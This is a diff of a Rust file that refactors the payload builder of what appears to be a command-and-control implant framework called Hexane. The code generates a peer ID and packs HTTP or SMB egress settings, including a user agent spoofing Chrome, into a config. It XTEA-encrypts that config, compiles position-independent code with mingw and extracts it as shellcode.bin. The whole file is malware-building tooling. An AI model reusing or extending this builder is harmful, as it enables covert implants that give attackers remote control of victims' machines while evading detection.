@@ -1,21 +1,19 @@
 use std::fs;
-use std::path::{Path, PathBuf};
+use std::path::{ Path, PathBuf };
 use std::str::FromStr;
-use rand::Rng;
+use rand::prelude::*;
 
-use hexlib::types::Hexane;
-use hexlib::stream::Stream;
+use crate::types::Hexane;
+use crate::stream::Stream;
 
-use hexlib::error::{Error, Result, Error::Custom};
-use hexlib::types::NetworkType::Http as HttpType;
-use hexlib::types::NetworkOptions::Http as HttpOpt;
-use hexlib::types::NetworkType::Smb as SmbType;
-use hexlib::types::NetworkOptions::Smb as SmbOpt;
+use crate::types::NetworkType::Http as HttpType;
+use crate::types::NetworkOptions::Http as HttpOpt;
+use crate::types::NetworkType::Smb as SmbType;
+use crate::types::NetworkOptions::Smb as SmbOpt;
 
-use crate::rstatic::USERAGENT;
-use crate::interface::wrap_message;
-use crate::binary::{extract_section, run_command};
-use crate::cipher::{crypt_create_key, crypt_xtea};
+use crate::error::{ Error, Result, Error::Custom };
+use crate::binary::{ extract_section, run_command };
+use crate::cipher::{ crypt_create_key, crypt_xtea };
 use crate::utils::{
     canonical_path_all,
     generate_definitions,
@@ -28,20 +26,14 @@ use crate::utils::{
 
 pub static DEBUG_FLAGS: &'static str = "-std=c++23 -Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel -fno-ident -fpack-struct=8 -falign-functions=1 -ffunction-sections -fdata-sections -falign-jumps=1 -w -falign-labels=1 -fPIC -fno-builtin '-Wl,--no-seh' ";
 pub static RELEASE_FLAGS: &'static str = "-std=c++23 -Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel -fno-ident -fpack-struct=8 -falign-functions=1 -ffunction-sections -fdata-sections -falign-jumps=1 -w -falign-labels=1 -fPIC -fno-builtin '-Wl,--no-seh' ";
+pub static USERAGENT: &'static str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36";
 
-pub trait HexaneBuilder {
-    fn setup_build(&mut self) -> Result<()>;
-    fn compile_sources(&mut self) -> Result<()>;
-    fn create_config_patch(&mut self) -> Result<()>;
-    fn create_binary_patch(&mut self) -> Result<Vec<u8>>;
-    fn run_mingw(&mut self, components: Vec<String>) -> Result<()>;
-}
 
-impl HexaneBuilder for hexlib::types::Hexane {
-    fn setup_build(&mut self) -> Result<()> {
-        let mut rng = rand::thread_rng();
+impl Hexane {
+    pub fn setup_build(&mut self) -> Result<String> {
+        self.peer_id = rand::thread_rng()
+			.gen::<u32>();
 
-        self.peer_id = rng.random::<u32>();
         self.compiler_cfg.build_directory = format!("./payload/{}", &self.builder_cfg.output_name);
 
         let compiler_flags = if self.main_cfg.debug {
@@ -54,38 +46,33 @@ impl HexaneBuilder for hexlib::types::Hexane {
         self.compiler_cfg.flags = compiler_flags;
 
         if let Err(e) = fs::create_dir_all(&self.compiler_cfg.build_directory) {
-            wrap_message("ERR", format!("create_dir_all: {e}").as_str());
-            return Err(Error::from(e))
+            return Err(Custom(format!("setup_build: {e}")))
         }
 
         if let Err(e) = generate_hashes("./configs/strings.txt", "./core/include/names.hpp") {
-            return Err(e);
+            return Err(Custom(format!("setup_build: {e}")))
         }
 
-        if let Err(e) = self.create_config_patch() {
-            return Err(e)
-        }
+        let mut patch = match self.create_binary_patch() {
+			Ok(patch) => patch,
+			Err(e) => {
+				return Err(Custom(format!("setup_build: {e}")))
+			}
+		};
 
-        if let Err(e) = self.compile_sources() {
-            return Err(e)
-        }
-
-        Ok(())
-    }
-
-    fn create_config_patch(&mut self) -> Result<()> {
         self.session_key = crypt_create_key(16);
-
-        let mut patch = self.create_binary_patch()?;
-        let encrypt = self.main_cfg.encrypt;
-
-        if encrypt {
+        if self.main_cfg.encrypt {
             let patch_cpy = patch;
             patch = crypt_xtea(&patch_cpy, &self.session_key, true)?;
         }
 
         self.config = patch;
-        Ok(())
+
+        if let Err(e) = self.compile_sources() {
+				return Err(Custom(format!("setup_build: {e}")))
+        }
+
+        Ok("setup_build: done.".to_string())
     }
 
     fn create_binary_patch(&mut self) -> Result<Vec<u8>> {
@@ -115,17 +102,18 @@ impl HexaneBuilder for hexlib::types::Hexane {
             for module in modules {
                 stream.pack_string(module);
             }
-        } else {
-            wrap_message("DBG", "no external module names found. continue.");
-        }
-
+        } 
         if let Some(network) = self.network_cfg.as_mut() {
             let rtype   = &network.r#type;
             let opts    = &network.options;
 
             match (rtype, &opts) {
                 (HttpType, HttpOpt(ref http)) => {
-                    let useragent = http.useragent.as_ref().unwrap_or(&USERAGENT);
+					let agent_string = USERAGENT.clone().to_string();
+
+                    let useragent = http.useragent
+						.as_ref()
+						.unwrap_or(&agent_string);
 
                     stream.pack_wstring(useragent);
                     stream.pack_wstring(&http.address);
@@ -155,16 +143,14 @@ impl HexaneBuilder for hexlib::types::Hexane {
                 }
 
                 (SmbType, SmbOpt(ref smb) ) => {
+
                     stream.pack_wstring(smb.egress_pipe
                         .as_ref()
                         .unwrap()
                         .as_str());
                 }
 
-                _ => {
-                    wrap_message("ERR", "create_binary_patch: unknown network type");
-                    return Err(Custom("JSONError".to_string()))
-                }
+                _ => return Err(Custom("create_binary_patch: unknown network type".to_string()))
             }
         }
 
@@ -179,10 +165,7 @@ impl HexaneBuilder for hexlib::types::Hexane {
         let src_path        = Path::new(root_dir).join("src");
 
         let entries = canonical_path_all(&src_path)
-            .map_err(|e| {
-                wrap_message("ERR", format!("canonical_path_all: {:?}:{e}", src_path).as_str());
-                return Custom(e.to_string())
-            })?;
+            .map_err(|e| format!("compile_sources::canonical_path_all: {:?}:{e}", src_path))?;
 
         let os = std::env::consts::OS;
         for path in entries {
@@ -190,26 +173,19 @@ impl HexaneBuilder for hexlib::types::Hexane {
                 "windows" => normalize_path(path.to_str().unwrap().into()),
                 "linux"   => path.clone().into_os_string().into_string().unwrap(),
                 _ => {
-                    wrap_message("ERR", "unknown OS");
                     return Err(Custom("unknown OS".to_string()))
                 }
             };
 
             let mut object_file = generate_object_path(&source, Path::new(build_dir))
-                .map_err(|e| {
-                    wrap_message("ERR", format!("compile_sources: {:?}:{e}", source).as_str());
-                    return Custom(e.to_string())
-                })?;
+                .map_err(|e| format!("compile_sources: {:?}:{e}", source))?;
 
             object_file.set_extension("o");
 
             let object = match os {
                 "windows" => normalize_path(object_file.to_string_lossy().to_string()),
                 "linux"   => object_file.to_string_lossy().to_string(),
-                _ => {
-                    wrap_message("ERR", "unknown OS");
-                    return Err(Custom("unknown OS".to_string()))
-                }
+                _ => return Err(Custom("unknown OS".to_string()))
             };
 
             let mut command = String::new();
@@ -223,25 +199,22 @@ impl HexaneBuilder for hexlib::types::Hexane {
                     command.push_str(format!(" -f win64 {} -o {}", source, object).as_str());
 
                     if let Err(e) = run_command(&command.as_str(), format!("{}-compiler_error", self.builder_cfg.output_name).as_str()) {
-                        wrap_message("ERR", format!("compile_sources:: {e} : {command}")
-                            .as_str());
-
-                        return Err(Custom("CommandError".to_string()));
+                        return Err(Custom(format!("compile_sources::{e} : {command}")))
                     }
+
                     components.push(object);
                 },
-                _ => {
-                    continue;
-                }
+                _ => continue,
             }
         }
 
         if let Err(e) = self.run_mingw(components) {
-            return Err(Custom(e.to_string()))
+            return Err(Custom(format!("compile_sources: {e}")))
         };
 
         let output = &self.builder_cfg.output_name;
-        let mut shellcode = self.compiler_cfg.build_directory.to_owned();
+        let mut shellcode = self.compiler_cfg.build_directory
+			.to_owned();
 
         shellcode.push_str("/shellcode.bin");
         extract_section(output, &self.config, shellcode.as_str())
@@ -274,10 +247,7 @@ impl HexaneBuilder for hexlib::types::Hexane {
 			linker = match os {
 				"windows" => normalize_path(path),
 				"linux"   => path,
-				_ => {
-					wrap_message("ERR", "unknown OS");
-					return Err(Custom("unknown OS".to_string()))
-				}
+				_         => return Err(Custom("unknown OS".to_string()))
 			};
             linker = format!(" -T\"{}\" ", linker);
         }
@@ -300,7 +270,7 @@ impl HexaneBuilder for hexlib::types::Hexane {
         self.builder_cfg.output_name = format!("{}/{}.exe", build, output);
         let command = format!("x86_64-w64-mingw32-g++ {} -o {}", params.join(" "), self.builder_cfg.output_name);
 
-        // TODO: build fails because "sections below image base" which is normal for this.
+        // TODO: build fails because of "section(s) below image base", which is normal for this.
         run_command(command.as_str(), format!("{}-linker_error", output).as_str());
         Ok(())
     }
